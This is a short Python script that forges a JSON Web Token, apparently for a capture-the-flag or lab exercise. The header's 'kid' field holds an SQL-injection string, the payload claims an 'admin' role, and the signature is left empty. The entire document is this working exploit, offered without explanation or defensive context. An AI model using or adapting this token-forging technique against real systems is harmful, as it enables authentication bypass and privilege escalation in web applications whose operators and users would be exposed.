import base64
def jwtBase64Encode(x):
    return base64.b64encode(x.encode('utf-8')).decode().replace('+', '-').replace('/', '_').replace('=', '')
header = '{"typ":"JWT","alg":"HS256","kid":"" 1=1--"}'
payload = '{"user_id": 2,"role":"admin","hack": ""}'
print(jwtBase64Encode(header)+'.'+jwtBase64Encode(payload)+'.')
